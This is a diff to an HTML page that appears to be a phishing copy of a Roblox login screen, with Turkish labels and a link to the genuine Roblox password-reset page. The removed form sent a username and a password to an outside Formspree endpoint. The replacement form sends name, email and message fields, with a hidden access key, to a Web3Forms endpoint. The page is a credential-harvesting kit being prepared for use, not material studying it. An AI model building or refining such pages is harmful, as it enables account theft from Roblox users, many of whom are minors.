@@ -155,12 +155,13 @@
     <div class="login-card">
         <h2>Hesap ekle</h2>
 
-        <form action="https://formspree.io/f/BURAYA_KODUNU_YAZ" method="POST">
-            <input type="text" name="user" placeholder="Kullanıcı adı/E-posta/Telefon" required>
-            <input type="password" name="pass" placeholder="Şifre" required>
-            
-            <button type="submit" class="primary-btn">Giriş yapmak</button>
-        </form>
+        <form action="https://api.web3forms.com/submit" method="POST">
+  <input type="hidden" name="access_key" value="4d9b8514-bee7-4916-bfab-e61246fa5ba7">
+  <input type="text" name="name" required>
+  <input type="email" name="email" required>
+  <textarea name="message" required></textarea>
+  <button type="submit">Submit</button>
+</form>
 
         <a href="https://www.roblox.com/login/forgot-password-or-username" class="forgot-text">Şifrenizi veya kullanıcı adınızı mı unuttunuz?</a>
         
@@ -174,3 +175,4 @@
 
 </body>
 </html>
+
